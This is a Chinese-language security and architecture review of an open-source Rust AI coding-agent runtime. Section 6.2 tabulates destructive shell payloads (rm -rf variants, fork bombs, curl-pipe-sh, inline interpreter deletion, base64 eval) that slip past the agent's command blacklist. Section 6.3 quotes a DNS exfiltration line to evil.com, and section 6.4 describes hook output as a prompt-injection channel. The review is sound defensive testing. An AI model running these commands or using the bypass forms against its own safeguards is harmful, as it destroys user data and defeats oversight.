# minicoding-rs 全面深度审查报告（R9）

> 本文档与 `docs/project-review-2026*.md` 系列同构（R2–R8 已归档于 `docs/`）。
> 问题编号采用 `R9-<域>-<序号>`；严重度 P0（可被利用/数据丢失）→ P1（严重缺陷）
> → P2（纵深防御/一致性）→ P3（轻微）。
> **增补篇**（服务端协议层 / MCP / tools 写路径 / storage-journal）：
> `docs/project-review-20260829-r9b.md`。

- **审查对象**：`~/projects/minicoding-rs`（WSL Ubuntu-26.04）
- **审查基线**：`main` @ `daecdb7`，版本 `v0.3.9`，工作区有 3 个未提交修改
- **审查时间**：2026-08-29
- **代码规模**：Rust 源 84,195 行 / 297 个 `.rs` 文件 / 19 个 crate 目录（18 个 Cargo crate + 1 个 npm 前端）；另有 Web 前端 TS/TSX 约 15,000 个文件
- **文档规模**：25,805 行（含 8 份历史审查报告 R2–R8）

---

## 0. 审查方法说明（请先读这一节）

本次审查**没有**停留在读文档和读代码，对关键结论做了实证验证。以下几条是判断后面所有结论可靠性的前提：

| 验证项 | 方法 | 结果 |
|---|---|---|
| 可构建性 | `cargo check --workspace --all-targets` | **通过，0 warning，10.2s（增量）**；`rustc 1.100.0-nightly (8fa1c96cf 2026-08-17)` |
| 权限黑名单强度 | 在 `/tmp` 建独立 crate，以 **public API** `BuiltinPolicy::check` 对 36 个 payload 做黑盒矩阵测试 | **19/36 在 `BypassPermissions` 下被判 `ALLOW`**（详见 §6.2 实测表） |
| 严重性校准 | 同一批 payload 在 `Default` 模式下复测 | **全部返回 `ASK`**（默认姿态安全，故定级 P1 而非 P0） |
| 路径沙箱 | 构造真实临时目录 + 指向外部的符号链接，测 7 类路径 | `..` 逃逸 / 绝对路径 / **符号链接逃逸** 均 `DENY`（正确） |
| Token 计数精度 | 对 `TiktokenTokenizer` 与 `ApproxTokenizer` 做对照实测 | emoji **−84.6%**、JSON 转义中文 **−52.6%**、中英混排 **−26.3%** |
| 依赖与文档一致性 | 逐 crate 解析 `Cargo.toml` 与文档交叉比对 | 发现 4 类文档-实现裂缝（§9） |

> **诚实边界**：`unwrap/expect/panic` 的绝对计数（如 tools 的 `expect=262`）**包含内联测试代码**，不能作为生产代码质量的直接证据，本报告只把它作为"需要人工抽查"的线索，不作为结论。

---

## 1. 总体判断

**一句话**：这是一个**工程量与工程素养都显著超出典型个人项目水位**的 Rust AI 编码助手——架构分层清晰、trait 抽象克制、安全边界有真实思考、且**对自己的缺陷极度诚实**（代码中大量"诚实边界"注释）。但它目前仍是**高质量的"设计原型 + 能力完备的 CLI 工具"**，而非可直接交付企业的生产级系统；距"生产级"的差距**不在功能数量，而在三处结构性断点**：四形态能力不一致、安全默认值与文档承诺存在落差、工具链钉在 nightly。

### 评分（10 分制）

| 维度 | 评分 | 说明 |
|---|:---:|---|
| 架构设计 | 8.5 | 分层干净、trait 抽象合理、"零实现 core"执行到位；但存在双 Runtime 装配点 |
| 模块化与依赖治理 | 8.0 | 依赖图无环、无循环依赖；但文档声明与真实依赖图不符 |
| Provider / 工具系统 | 8.0 | 三 provider 能力对齐良好，流式解析测试扎实；token 估算精度有系统性偏差 |
| 上下文与记忆 | 8.0 | 4 级管道 + 熔断 + 校准设计完整；降级链考虑周到 |
| 安全模型 | 7.0 | 默认姿态安全、路径沙箱实测可靠；**但黑名单是词法启发式，实测可绕过 19/36** |
| OS 沙箱强度 | 6.0 | Linux 尚可（有真实 Landlock + fail-closed）；**Windows 基本无隔离**；网络限制依赖 Linux 6.7+ |
| 四形态一致性 | 5.5 | **最大短板**：Web/Desktop 缺 Hook / AutoMemory / 子 Agent |
| 文档完备性 | 8.0 | 体量惊人、有 8 轮自审；但存在 4 类与代码矛盾的裂缝 |
| 工程化 / CI | 8.5 | 10 道门禁、三平台 matrix、SHA 钉版 —— 相当扎实 |
| 测试 | 7.5 | 1,711 个内联测试密度不低；但覆盖率门禁**排除了前端层** |
| **生产就绪度** | **6.5** | nightly 钉版 + 四形态能力差 + 黑名单可绕过，共同构成阻塞项 |

---

## 2. 项目定位与差异化（相对 Claude Code / Codex）

### 2.1 做对了什么

项目对自身定位是清晰的：**"可嵌入、可扩展、安全可控的智能体运行时"**，而不是"又一个 Claude Code 克隆"。这个定位有实质支撑：

- **`minicoding-sdk` 作为一等公民**：`minicoding-cli` 的 `builder.rs` 实际只有一行 `pub use minicoding_sdk::builder::{...}`（A11 下沉），说明"CLI 只是 SDK 的一个消费者"是**真的做到了**，不是口号。这让"可嵌入"有了架构保证。
- **四形态共享 Runtime**：协议层（`minicoding-protocol`）+ 聚合根（`SessionManager`）+ `Runtime` 三者确实被 CLI/TUI/Web/Desktop 复用（详见 §7）。
- **安全能力是对标 CC 时真正想做出差异的地方**：OS 沙箱（landlock/Seatbelt/Job Object）、Hook 生命周期、L0 硬约束不可被 Hook 覆盖、MCP 项目作用域首次批准——这几项的确是 CC/Codex 的用户真实痛点。

### 2.2 定位上的问题

**问题 1（P1）：差异化叙事与可验证事实存在落差。**

README 主打的"安全可控"在多处**超额承诺**。最典型的是沙箱：

> README §2：「基于 Linux `landlock`…+ macOS Seatbelt…+ **Windows Job Object**…；**macOS/Linux/Windows 内核级隔离**作为应用层权限之外的第二道防线」

但 `crates/minicoding-sandbox/src/windows.rs:1-25` 自己写得很清楚：

```
//! Job Object **不提供**：文件系统隔离（不像 Linux Landlock / macOS Seatbelt）、
//! 网络过滤（需 WFP）、CPU/内存资源上限（当前未设置 JOBOBJECT 限额字段）。
//! …`is_hardened()` 如实返回 false，doctor 不高估防护。
```

**代码是诚实的，README 不是。** Windows 上既无 FS 隔离、也无网络过滤、也无资源上限，且 `is_hardened()` 返回 `false`——这不能称为"内核级隔离"。建议 README 的沙箱能力矩阵直接引用代码里已有的诚实描述。

**问题 2（P2）："四形态"在宣传口径上未标注能力差异。** README §6 把 CLI/TUI/Web/Desktop 并列展示，但 Web/Desktop 实际缺失 Hook、AutoMemory、子 Agent（§7.2）。用户按 README 预期使用 Web 会踩空。

**问题 3（P2）：相对 CC/Codex 的差异化，缺一条"为什么我要换"的硬理由。** 目前列出的能力（工具、压缩、Hook、MCP、Plan）基本是 CC 已有的对等实现，真正的差异点——**可嵌入 SDK、可自托管 server、OS 级沙箱、AGPL 开源**——在 README 里反而排在后面。定位叙事应把"我能被嵌进你的产品 / 我能私有化部署 / 我有真实沙箱"前置。

---

## 3. 架构设计

### 3.1 做得好的部分

分层（`Frontend → Orchestration → Capability → Infrastructure`）与"core 只定义 trait + 编排、零领域实现"的原则**执行得很彻底**。我用依赖图验证了这一点：

```
core          → (无内部依赖)                ✅ 真正的零依赖
context       → core
policy        → core
memory        → core
hooks         → core
journal       → core
sandbox       → core
mcp           → core
storage       → core
providers     → core
protocol      → core
extension-sdk → core
server        → core, protocol, policy, tools, context, storage, providers, memory, journal, sandbox
tools         → core, policy
sdk           → core, policy, tools, context, storage, providers, memory (+可选)
cli           → core, sdk, context, policy, storage, providers, tools (+可选)
tui           → core, policy, sdk, storage
desktop       → core
```

- **无循环依赖**（`core` 不依赖任何内部 crate）。
- **`core` 确实是零实现**：15,906 行里绝大部分是 trait、数据模型、Runtime 编排、Prompt 管道。
- 依赖注入而非编译期耦合：`ToolContext` 用 `Option<Arc<dyn SandboxDriver>>` / `Option<Arc<dyn Journal>>` 注入能力，**`minicoding-tools` 因此不需要依赖 `minicoding-journal` / `minicoding-sandbox`**。这是比文档描述更好的设计。

### 3.2 架构问题

#### **ARCH-1（P1）：存在两个并行且能力不对等的 Runtime 装配点**

这是本次审查发现的**最严重的架构问题**，它是四形态能力漂移的根因。

| 装配点 | 使用者 | 能力 |
|---|---|---|
| `minicoding-sdk/src/builder.rs` | CLI、TUI | **完整**：Hook registry、AutoMemory 注入、真实 SubagentRunner、context/compress hook |
| `minicoding-server/src/runtime_builder.rs` | **Web、Desktop** | **残缺**：无 Hook、无 AutoMemory 注入、`NoopSubagentRunner`、无配置热更新 |

`crates/minicoding-server/src/runtime_builder.rs:11-16` 自己承认：

```
//! - **无 Hook registry / asyncRewake**（Hook 未接线；Web/Desktop 会话无 Hooks 能力…）
//! - **无 `AutoMemory` 记忆注入**…无配置热更新（S-22）
//! - `task.spawn` 走 `NoopSubagentRunner`
```

而 `minicoding-sdk/src/builder.rs` 里这些都有（`:277` AutoMemory、`:367` hook_registry）。

**为什么这是设计缺陷而非只是"待办"**：两份 `build_runtime` 意味着每一次新增能力（如 R8 刚加的 AGENTS.md 注入、PreCompact hook）都要**手工同步两处**，否则能力漂移。从 git 历史看，这个漂移**已经发生了至少一轮**（R8 才把 AGENTS.md / git/web/memory/ui.ask 补到 server 侧）。只要双轨存在，漂移就会反复发生。

> 项目自己在 `docs/modules.md` §18.4 把这个问题记录为 ARCH-2/ARCH-3 并计划"双轨 builder 合并"——**方向正确，建议提为最高优先级**。

**建议**：让 server 的 `build_runtime` 直接委托 `minicoding-sdk::builder`（server 已经依赖了 sdk 需要的所有 crate），只覆盖 prompter / session 加载策略等少数差异点。

#### **ARCH-2（P2）：`minicoding-tools` 的"组合层"定位与真实依赖不符**

`docs/modules.md` §11 把 tools 描述为可依赖多个领域 crate 的"组合层"，但 `crates/minicoding-tools/Cargo.toml` 里这些依赖**全被注释掉了**：

```toml
# 组合层可按需依赖多个领域 crate（见 modules.md §11.3）
minicoding-policy = { workspace = true }
# memory = ["dep:minicoding-memory"]
# hooks  = ["dep:minicoding-hooks"]
# file-undo = ["dep:minicoding-journal"]
# sandbox = ["dep:minicoding-sandbox"]
# mcp = ["dep:minicoding-mcp"]
web = ["dep:reqwest", "dep:url"]
```

实际只依赖 `core` + `policy`（+ `web` feature 下的 reqwest/url）。

**评价**：如 §3.1 所述，**实际实现（DI 注入）比文档描述（编译期依赖）更好**。问题在文档。但副作用是——**装配责任被推给了每个前端**，这正是 ARCH-1 漂移的放大器。

#### **ARCH-3（P2）：`external-sandbox` 与 `DangerFullAccess` 策略直接返回 `Ok(())`**

`crates/minicoding-sandbox/src/linux.rs`：

```rust
SandboxPolicy::ExternalSandbox | SandboxPolicy::DangerFullAccess => Ok(()),
```

语义上可辩护（依赖外部隔离/用户显式放弃），但 `ExternalSandbox` 在 README 中被宣传为"CI/容器推荐模式"——**它是 fail-open 的**：如果容器本身没有隔离（普通 docker run 而非 gVisor/Kata），这个模式等价于裸奔，且**系统不会有任何警告**。

**建议**：`ExternalSandbox` 启动时主动探测容器环境（是否在 cgroup/namespace 受限环境），探测不到则 warn。

#### **ARCH-4（P3）：`is_hardened()` 从未被用作运行时门禁**

全仓 `is_hardened()` 的消费点只有 `crates/minicoding-cli/src/commands/doctor.rs:48`——**一个诊断命令**。这意味着：

- 内核 < 5.13 → `detect_driver()` 降级 `NoopDriver` + 一条 warn → **系统照常运行，用户毫不知情**；
- 没有任何"策略要求硬隔离但驱动不支持就拒绝启动"的门禁。

**建议**：增加 `sandbox.require_hardened: bool` 配置；为 true 而 `is_hardened()==false` 时拒绝执行副作用工具（fail-closed），或至少在每次会话启动打印显著警告而非仅 `tracing::warn`。

---

## 4. AI Provider 系统

### 4.1 评价：**这是全项目完成度最高的模块之一**

三个 provider（`anthropic` 1750 行 / `openai` 1718 行 / `ollama` 1212 行）实现了**完全一致的 trait 表面**：`id` / `capabilities` / `tokenizer` / `chat_stream` / `count_tokens`，且 Tokenizer 侧 `count` / `count_messages` / `id` 齐备。**没有发现任何 `todo!()` / `unimplemented!()` 桩函数**——全仓仅有 4 处 `unreachable!()`，且都在可辩护位置。

测试质量尤其好，`crates/minicoding-providers` 有 **217 个内联测试**，覆盖了真实世界容易出错的点：

- 错误路径：`chat_stream_401/429/500/connection_refused/invalid_json`
- 限流：`retry_after_ms_parses_seconds_to_millis` / `_missing_` / `_invalid_`
- **凭证泄露**：`debug_does_not_leak_api_key`（anthropic/openai 各有）
- 各家推理字段差异：`parse_chunk_reasoning_content_deepseek` / `_openai_o_series` / `_prioritizes_reasoning_content`
- Anthropic 特有：`build_request_body_thinking_disables_temperature`、`prompt_caching_breakpoints`

**这是一个真正做过跨 provider 实机调试的团队才会写的测试集。**

### 4.2 问题

#### **PROV-1（P1）：Anthropic 使用 `ApproxTokenizer`，实测存在系统性低估**

`crates/minicoding-providers/src/anthropic.rs:625` 定义 `ApproxTokenizer`（CJK 计 1 token/字，其余 `ceil(chars/4)`）。我实测了它与真实 BPE 的偏差：

| 样本 | chars | tiktoken(cl100k) | anthropic-approx | 偏差 |
|---|:--:|:--:|:--:|:--:|
| 纯英文 | 45 | 11 | 12 | **+9.1%** |
| 中文散文 | 33 | 36 | 33 | −8.3% |
| 中文代码注释 | 28 | 24 | 26 | +8.3% |
| 中英混排 | 50 | 19 | 14 | **−26.3%** |
| emoji | 5 | 13 | 2 | **−84.6%** |
| JSON 转义中文 | 36 | 19 | 9 | **−52.6%** |

**风险方向是坏的**：低估 = 压缩触发过晚 = 真实 `context_length_exceeded` 400 错误。

**这不是理论风险**——CHANGELOG v0.3.9 里 R8 刚修的 `ContextLength 紧急压缩联动（PT4-3）` 描述正是：

> 「真实 400 上下文超长此前只回灌 LLM 自修正、压缩永不触发（**本地阈值低于模型真实窗口时不压缩**）。首次命中触发 `force_compress`…」

**即该问题已在真实使用中被观察到**。R3 修过一次 CJK 低估（从 `chars/4` 改为 CJK 计权），但 emoji 与 JSON 转义路径仍未覆盖。

**JSON 转义中文（`\u4f60\u597d`）−52.6% 尤其值得注意**：工具调用参数与工具结果常以 JSON 序列化进入上下文，若 `Message::full_text()` 的 tool_calls 部分走了转义路径，实际低估会成倍累积。

**建议**：
1. 对 `\uXXXX` 转义序列按解码后字符计数（廉价修复，覆盖最大偏差项）；
2. emoji / 非 BMP 字符按 2–4 token 保守计权；
3. 更根本的方案：用 provider 返回的真实 `usage.input_tokens` 做**硬校准**（项目已有 `calibrate()`，见 §5，但只做 midpoint 混合且默认可能未在所有路径调用）。

#### **PROV-2（P2）：Ollama 用 `TiktokenTokenizer` 估算本地模型**

`crates/minicoding-providers/src/ollama.rs:90` 用 `TiktokenTokenizer::new_for_model(&model_str)`。但 Ollama 跑的是 Llama / Qwen / Mistral / DeepSeek，**这些都不是 OpenAI BPE**。对中文场景常用的 Qwen 系列，cl100k 会**显著高估**（Qwen2 的 151k 词表对中文压缩率高得多）；对英文代码则可能低估。

影响相对可控（高估方向安全），但对本地小模型（如 32K 上下文的 qwen-32b）会造成**过早压缩、浪费本就紧张的上下文**。

**建议**：Ollama 侧改用 `num_ctx` 感知的保守估算，或让 `OllamaProvider` 支持按模型族配置 token 系数。

#### **PROV-3（P2）：`capabilities()` 的模型探测是硬编码前缀表**

R8 新增的 `capabilities` 探测按模型前缀判断窗口（deepseek→64K、qwen-32b→32K、其余 128K 保守默认）。这类**硬编码表必然过期**——新模型发布后会被错误分类。

**建议**：提供 `config.toml` 覆盖入口，并在探测失败/使用默认值时打 warn。

---

## 5. 上下文管理（4 级压缩）与记忆机制

### 5.1 设计评价：**思虑周密，超出预期**

`docs/design.md` §3 的 4 级压缩管道（L1 工具结果裁剪 → L2 旧消息摘要 → L3 滚动窗口 → L4 硬截断）**在代码中确实落地了**（`crates/minicoding-context/src/manager.rs`，1,470 行 + 601 行测试）。更难得的配套设计：

- **压缩熔断 + 防 Thrash**（§3.6）：`fail_count=3` 熔断、`thrash_count=2` 熔断，与工具迭代上限、沙箱拒绝熔断器三者分工明确。Thrash 是压缩系统最危险的失效模式（压缩→填满→再压缩→烧光预算），**能想到并做状态机防护说明踩过坑**。
- **L2 摘要失败降级链**（§3.8）：主模型 → 备用小模型重试 1 次 → 启发式兜底（首 80 字+末 80 字，标 `quality=heuristic`）→ 跳过进 L3。**"永不向上抛错中断对话"** 是对的原则。
- **压缩追溯**（M-07）：`compressed_range` 记录被替代消息的序号区间与掉 token 量，落 `AuditKind::Compress` 审计。**这是可运维性的关键**，很多同类产品没有。
- **压缩后状态保留清单**（§3.7）：系统提示、权限模式、预批准缓存、任务列表、FileChangeJournal 跨压缩保留——**特别是"Plan 模式压缩后仍是 Plan"和"预批准不因压缩失效"**，这两条是安全相关状态，能想到说明安全与上下文是被一起设计的。
- **真实用量回灌校准**：`ContextManager::calibrate(actual_input_tokens)` 用 `usize::midpoint` 混合估算值与 provider 返回的真实 `input_tokens`，并有 `actual == 0` 护栏（防止把缓存砍半导致低估）。代码注释还坦承了口径差（`actual` 含 system+tools 开销而缓存仅 messages，导致系统性高估，方向保守）。**这是一段质量很高的实现。**

### 5.2 问题

#### **CTX-1（P2）：`calibrate()` 的口径不一致会持续引入系统性偏差**

注释已承认：`actual`（含 system + tools schema 固定开销）与 `token_cache`（仅 messages）口径不同。对一个工具较多的会话，tools schema 可能是数千 token，**这会让校准值持续高于真实消息量**，导致过早压缩（浪费预算）。虽然方向安全，但长会话中会明显损失有效上下文。

**建议**：`calibrate` 时减去当次请求的 system+tools 开销，或单独维护"固定开销"基线。

#### **CTX-2（P2）：`ApproxTokenizer` 低估 + 熔断阈值，组合出"静默降级"路径**

低估（PROV-1）→ 压缩触发晚 → 直到真实 400 才 `force_compress` → 若压缩后仍超，触发 thrash 熔断 → 中止本轮。**用户感知是"助手突然说上下文压缩失败"**，而不是平滑降级。

**建议**：把 `predictive_baseline_growth_tokens`（默认 15000）与估算误差上界联动，或在检测到 provider 返回真实用量持续高于估算 20% 时自动收紧触发阈值。

#### **CTX-3（P3）：L2 启发式摘要质量未做上限保护**

启发式兜底取"首 80 字 + 末 80 字"。对代码类消息，首 80 字常是 `fn foo(args) -> Result<...>` 签名、末 80 字是闭合括号，**中间的实现逻辑全部丢失**且被标为摘要。若 L2 大量走启发式路径，模型会看到一批"看起来像摘要实则无信息"的消息。

**建议**：启发式摘要强制附加原始 token 数与截断标记，让模型知道这是低质量摘要。

#### **CTX-4（P2）：AutoMemory 的失效/冲突治理未见机制**

`crates/minicoding-memory/src/auto.rs`（1,075 行）做自动记忆抽取。设计上有分类（`AutoCategory`）与 topic 去重，但**未见**：
- 记忆过期/失效机制（关于某段代码的记忆，在该代码被重构后变成**错误知识并持续误导**）；
- 冲突消解（两条互相矛盾的记忆如何取舍）；
- 用户可见性与撤销入口是否完备（Web/Desktop 侧尚未注入，见 §7）。

**建议**：记忆条目记录来源文件 + mtime + 内容指纹，源文件变更超过阈值时自动标记 `stale` 并在注入时降权。

#### **CTX-5（P3）：项目记忆（AGENTS.md）的陈旧风险**

`project_doc/loader.rs`（1,084 行）实现分层加载 + `@import`（有深度/循环保护、`canonicalize_within` 路径约束）。但**AGENTS.md 是静态文档，会随代码演进而过时**，而过时的指令层比没有指令层更危险（模型会照着错的规范写代码）。

**建议**：注入时附带 AGENTS.md 的最后修改时间，并在文件超过 N 天未更新时提示用户复核。

---

## 6. 安全：权限模型、黑名单、沙箱、Hook

### 6.1 权限模型评价

`PermissionPolicy`（决策）与 `PermissionPrompter`（交互）双抽象、L0 硬约束不可覆盖、Plan 模式硬门、预批准缓存——**设计是对的**。实测确认 L0 黑名单优先级确实高于一切：

```
fs.delete AGENTS.md              -> DENY(destructive op on project doc is blacklisted)
fs.write  AGENTS.md              -> ASK  (C-23：Ask 且不提供 AllowAlways)
fs.edit   AGENTS.md              -> ASK
shell.run "rm AGENTS.md"         -> DENY
shell.run "echo x > .git/hooks/pre-commit" -> DENY
```

路径沙箱（C-03）实测**表现良好**，我构造了指向 workdir 外部的符号链接：

| 输入 | 判定 |
|---|---|
| `<workdir>/a.txt` | ASK（正常） |
| `<workdir>/../outside.txt` | **DENY**（path escapes workdir） |
| `/etc/passwd` | **DENY** |
| `/tmp/x` | **DENY** |
| **符号链接 → 外部文件** | **DENY** ✅ |
| `<workdir>/.git/config` | **DENY**（VCS 元数据） |

**符号链接逃逸被正确拦截**（走了 `canonicalize`），这一点很多同类工具会漏。

**唯一异常**：`~/.ssh/id_rsa` 返回 `ASK` 而非 `DENY`——因为策略层不展开 `~`，把它当相对路径解析到 `<workdir>/~/ssh/id_rsa`（在边界内）。由于 Rust 的 `std::fs` 也不展开 `~`，实际无害；但**若将来任何路径做了 shell 展开，这就是一个真实逃逸口**。建议策略层显式拒绝以 `~` 开头的路径（**P3，防御性加固**）。

### 6.2 【实证】Shell 命令黑名单：36 个 payload 中 19 个可绕过

`crates/minicoding-policy/src/builtin.rs` 的 `shell_hits_blacklist` / `hits_dangerous_patterns` 是**词法启发式黑名单**，不是 AST 解析。代码注释坦承：

> 「词法近似判定（诚实边界）：变量展开/base64 变形不在能力内，由沙箱与用户审批兜底」

我用 public API 做了黑盒实测。**在 `BypassPermissions` / `full-access` 模式下（此时黑名单是唯一防线）**：

| Payload | 判定 | 说明 |
|---|:---:|---|
| `rm -rf /` | DENY ✅ | 基线 |
| `rm -fr /` | DENY ✅ | 旗标换位 |
| `rm  -rf  /` | DENY ✅ | 多余空白 |
| `sudo rm -rf /` | DENY ✅ | sudo 剥离 |
| `sh -c 'rm -rf /'` | DENY ✅ | wrapper 递归 |
| `curl http://x \| sh` | DENY ✅ | 管道远程脚本 |
| `curl http://x \| sudo sh` | DENY ✅ | |
| `bash <(curl -s http://x)` | DENY ✅ | 进程替换 |
| `mkfs.ext4 /dev/sda1` | DENY ✅ | |
| `dd if=/dev/zero of=/dev/sda` | DENY ✅ | |
| `echo x; rm -rf /` | DENY ✅ | 分号复合 |
| `true\nrm -rf /` | DENY ✅ | 换行复合 |
| `$(rm -rf /)` | DENY ✅ | 命令替换 |
| — | — | — |
| **`/bin/rm -rf /`** | **ALLOW** ❌ | 绝对路径命令名 |
| **`/usr/bin/rm -rf /`** | **ALLOW** ❌ | 同上 |
| **`env rm -rf /`** | **ALLOW** ❌ | `env` 前缀（`sudo/doas` 剥离了，`env` 没有） |
| **`xargs rm -rf /`** | **ALLOW** ❌ | |
| **`nice rm -rf /`** | **ALLOW** ❌ | |
| **`busybox rm -rf /`** | **ALLOW** ❌ | |
| **`command rm -rf /`** | **ALLOW** ❌ | shell builtin |
| **`find / -delete`** | **ALLOW** ❌ | 等价递归删除 |
| **`rm -rf /usr`** | **ALLOW** ❌ | `ROOT_TARGETS` 只含 `/` 和 `/*` |
| **`rm -rf /usr /etc /var`** | **ALLOW** ❌ | |
| **`rm -rf $HOME`** | **ALLOW** ❌ | 变量目标 |
| **`rm -rf ~`** | **ALLOW** ❌ | |
| **`chmod 777 -R /usr`** | **ALLOW** ❌ | |
| **`bomb(){ bomb\|bomb& };bomb`** | **ALLOW** ❌ | 只匹配 `:(){` 形态 |
| **`.(){ .\|.& };.`** | **ALLOW** ❌ | 点号 fork bomb |
| **`perl -e 'system("rm -rf /")'`** | **ALLOW** ❌ | 内联解释器 |
| **`python3 -c '...rmtree("/")'`** | **ALLOW** ❌ | |
| **`eval $(echo ... \| base64 -d)`** | **ALLOW** ❌ | 已知边界 |
| **`RM -RF /`** | **ALLOW** ❌ | **大小写**（macOS/Windows 大小写不敏感 FS 上是真实绕过） |

**严重性校准（重要）**：我复测了 `Default` 模式——**上述全部返回 `ASK`**，即默认姿态下用户仍会看到确认弹窗。所以这不是"默认就危险"，而是**"在 auto-approve / full-access / `BypassPermissions` 模式下，黑名单这道防线基本可以被轻易绕过"**。定级 **P1**。

**根因**：`hits_dangerous_patterns` 取"第一个不以 `-` 开头的 token"作为动词，与硬编码动词表精确匹配。任何**前缀包装**（`env`/`xargs`/`nice`/`busybox`/`command`/绝对路径）都会改变第一个 token。

**建议（按性价比排序）**：
1. **动词取" basename + 剥离包装前缀"**：对 `/bin/rm` 取 basename；对 `env`/`xargs`/`nice`/`nohup`/`command`/`busybox`/`timeout`/`sudo`/`doas` 循环剥离（已有 sudo/doas，补全其余）；
2. **动词比较统一小写**（消除 `RM -RF` 绕过）；
3. **`ROOT_TARGETS` 扩展**：从 `["/", "/*"]` 扩到系统关键目录集合（`/usr /etc /var /bin /sbin /lib /boot /sys /proc /dev`）+ 变量形态（`$HOME`、`~`、`..`、`$PWD`）；
4. **fork bomb 改为结构判定**：不依赖函数名，检测 `func(){ ... | ... & }` 的递归管道 + 后台形态；
5. **把这份 payload 矩阵固化为回归测试**（`crates/minicoding-policy/tests/` 下新增 security 回归套件），防止后续修改再次打开这些口子；
6. 中期：引入轻量 shell 词法/语法分析（哪怕只做 tokenize + 简单的命令树），从"字符串黑名单"升级为"结构判定"。

### 6.3 沙箱强度：三平台严重不对等

| 平台 | 实现 | FS 隔离 | 网络隔离 | 资源上限 | `is_hardened()` |
|---|---|:---:|:---:|:---:|:---:|
| Linux | Landlock LSM（`pre_exec` 内 `restrict_self`） | ✅ | ⚠️ 仅 TCP，需 **Linux 6.7+/ABI≥4** | ❌ | `true` |
| macOS | Seatbelt `sandbox_init` | ✅ | 需核实 | 需核实 | `true` |
| Windows | Job Object | **❌** | **❌** | **❌** | **`false`** |

#### **SANDBOX-1（P1）：Linux 网络限制覆盖面不足**

`crates/minicoding-sandbox/src/linux.rs:255-268` 自己写得很清楚：

> 「landlock ABI4 网络原语仅覆盖 TCP——**UDP/DNS/ICMP/raw socket 不受限**，"deny all TCP"≠断网。沙箱子进程仍可用 DNS 查询（`dig $(cat secret).evil.com`）或任意 UDP 报文对外通信。」

即：**在 Linux 6.7+ 上，DNS 隧道外传通道是打开的；在 < 6.7 上，整个网络都是打开的**（探测到不支持时只打 `tracing::warn!`，然后跳过）。

**建议**：
1. 文档中"OS 级沙箱"的能力矩阵必须标注内核版本要求与实际覆盖面；
2. `ReadOnly`/`WorkspaceWrite` 下若 `net_restriction_supported()==false`，应在**会话启动**显式提示用户，而非仅在 spawn 时打 debug 级日志；
3. 中期：考虑用 network namespace 或 seccomp 拦截 `socket(AF_INET, SOCK_DGRAM)` 补齐 UDP。

#### **SANDBOX-2（P1）：Windows 平台实质无沙箱**

见 §2.2。补充：`windows.rs` 还记录了并发缺陷：

> 「S24 已知限制（文档化）：共享同一 driver 实例**并发** spawn 时（如前台…」

`WindowsJobDriver` 用 **FIFO 队列**传递策略快照，并发 spawn 时 `post_spawn` 可能取到**别的进程的策略**——这是一个真实的正确性/安全竞态（策略错配 = 给错的子进程错误的隔离强度）。定级 **P1**。

**建议**：改为用 pid→policy 的 `HashMap` 查找，而非 FIFO 队列；或在 driver 侧持锁串行化 spawn 窗口。

#### **SANDBOX-3（P2）：Landlock "并集语义"使 `.git` 继承可写**

`linux.rs` 文档坦承：workdir 可写 ⇒ 其下 `.git` 也继承可写（Landlock 无法在可写父目录下做子目录只读）。补偿由应用层黑名单承担——**实测这条补偿是有效的**（`echo x > .git/hooks/pre-commit` → DENY）。但这意味着 **`.git` 保护完全依赖 §6.2 那个可绕过的词法黑名单**：`env echo x > .git/hooks/pre-commit` 之类变形能否被拦，取决于重定向目标判定是否受前缀影响（从代码看重定向判定基于 token 位置，与动词前缀无关，所以这条大概率仍拦得住，但值得加测试确认）。

#### **SANDBOX-4（P2）：seccomp 默认关闭，且是 denylist**

`Cargo.toml` 里 `libseccomp` 是 optional feature，注释明确"默认不开避免 CI/发行版需要头文件"。且 `seccomp::prepare_deny_filter` 是**拒绝列表**（只封危险 syscall），原则上可被未列举的 syscall 绕过。

**评价**：代码注释对 `pre_exec` 内 `libseccomp::load()` 的堆分配风险做了 Chromium 同款实践的坦诚说明——**这个技术判断是对的**。默认值保守（不开）也合理。

**建议**：在 `doctor` 中显著提示 seccomp 未启用；考虑在 release profile 中默认开启。

#### **SANDBOX-5（P2）：Windows 驱动的策略队列并发缺陷**

见 SANDBOX-2。

### 6.4 Hook 安全

#### **HOOK-1（正面）：配置层级设计是安全的**

我重点查了"克隆仓库即执行"风险。结论是**安全的**：

- `crates/minicoding-core/src/config.rs:1-2` 明确：「单一 user 级文件：`MINICODING_HOME/config.toml`；**project 层分层加载为规划项**」
- 全仓 `.rs` 中**没有任何代码**读取项目级 `hooks.toml` 或 `.minicoding.toml`

即：**仓库无法通过提交配置文件植入 Hook**。这与 MCP 的处理形成对比——MCP 的 `.minicoding/mcp.json` 确实是项目级且入版本控制的，但项目为此实现了 **C-24 首次批准机制**（`crates/minicoding-mcp/src/approval.rs`，逐 server 弹窗 + 结果落 `~/.minicoding/mcp_choices.toml` 0600）。**这个对比说明团队对"仓库不可信"是有意识建模的。**

**但文档是错误的**（见 §9 DOC-1）：4 份文档声称支持项目级 `hooks.toml`。

#### **HOOK-2（P2）：Hook 子进程默认无 OS 隔离**

`ScriptHook::with_sandbox` 是**可选注入**，「未注入时无内核级隔离（legacy 行为）」。R5 才补上 SEC-5。需要确认所有生产装配点都注入了——**server 侧没有 Hook，所以不受影响；SDK/CLI 侧已注入**（`builder.rs:368` 传入 `sandbox_pair`）。✅ 但这是"靠人工保证"，建议加断言。

#### **HOOK-3（P2）：Hook 输出注入模型上下文 = 提示词注入通道**

Hook 的 stdout JSON 可 `inject_context` 注入上下文。若某个 Hook 处理了不可信内容（如 PreToolUse on `web.fetch` 结果），其输出会进入模型上下文。**目前未见对 Hook 注入内容的来源标注/隔离**。建议注入时标记来源为 `hook:<name>` 并做长度上限（已有 1 MiB stdout 截断 ✅）。

### 6.5 其他安全观察

- **凭证隔离做得好**：`SAFE_ENV_WHITELIST` 单一事实源（`PATH/HOME/USER/LANG/LC_ALL/TERM/TMPDIR`），shell 与 Hook 子进程共用；`*_KEY`/`*_TOKEN`/`*_SECRET` 绝不传递；`fs.read` 对 `.env`/`credentials`/`*.pem` 走 `minicoding_policy::redact`。
- **进程组终止**：`libc` 依赖用于 `setpgid` + 超时 `killpg`（SEC-15），避免僵尸/孤儿进程——**这是 shell 工具最容易做错的地方，做对了**。
- **fork bomb 空白变体已修**（R8 `SEC-3`）：`compact.contains(":(){")` 对 `: () { : | : & }; :` 有效 ✅，但**其他函数名的 fork bomb 仍可绕过**（见 §6.2）。

---

## 7. 四形态前端与共享 Runtime 一致性

### 7.1 共享了什么（真实共享，非口号）

